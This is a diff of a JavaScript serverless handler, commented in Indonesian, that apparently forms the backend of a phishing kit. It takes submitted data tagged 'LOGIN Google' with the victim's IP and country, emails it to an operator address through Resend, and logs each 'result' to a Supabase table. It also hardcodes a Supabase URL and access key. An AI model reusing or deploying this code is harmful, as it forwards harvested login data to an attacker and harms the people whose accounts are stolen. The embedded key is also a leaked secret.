@@ -22,16 +22,13 @@ export default async function handler(req, res) {
         if (typeof d === "string") d = JSON.parse(d);
         if (!d) return res.status(400).json({ error: "BODY_EMPTY" });
 
-        // ==========================================
-        // GANTI URL & KEY SUPABASE LU DI SINI BANGSAT!
-        // ==========================================
+        // URL & Key Supabase lu
         const SUPABASE_URL = "https://djradeolrbjmgoxxbdlj.supabase.co"; 
         const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRqcmFkZW9scmJqbWdveHhiZGxqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTU1OTA0NDQsImV4cCI6MjExMTE2NjQ0NH0.RvLrul0eFafGUcOn_9ORB8xh3IaP4n1FAsEmqXnrXCA";     
         
         let EMAIL = process.env.RESS_EMAIL || "admin@domain.com";
         let NAMA = process.env.RESS_NAME || "RESS KENZO";
 
-        // 1. AMBIL CONFIG (EMAIL TUJUAN & NAMA RESS) DARI SUPABASE
         try {
             const rCfg = await fetch(`${SUPABASE_URL}/rest/v1/web_config?id=eq.1&select=*`, {
                 headers: { "apikey": SUPABASE_KEY, "Authorization": `Bearer ${SUPABASE_KEY}` }
@@ -46,7 +43,6 @@ export default async function handler(req, res) {
         const flag = countryFlag(d.negaraKode || "");
         const previewText = "ID | +62 | LOGIN Google | IP " + (d.ip || "-");
 
-        // 2. BIKIN HTML EMAIL
         const htmlBody = `
         <div style="display:none;max-height:0;overflow:hidden;font-size:1px;line-height:1px;color:#fff">${previewText}</div>
         <div style="font-family:Arial,sans-serif;background:#f4f4f4;padding:20px">
@@ -70,7 +66,6 @@ export default async function handler(req, res) {
           </div>
         </div>`;
 
-        // 3. KIRIM EMAIL PAKE RESEND
         const response = await fetch("https://api.resend.com/emails", {
             method: "POST",
             headers: { "Authorization": "Bearer " + API_KEY, "Content-Type": "application/json" },
@@ -84,7 +79,6 @@ export default async function handler(req, res) {
 
         const data = await response.json();
 
-        // 4. KALO EMAIL BERHASIL, CATAT STATISTIK KE SUPABASE
         if (response.ok) {
             try {
                 await fetch(`${SUPABASE_URL}/rest/v1/logs_result`, {
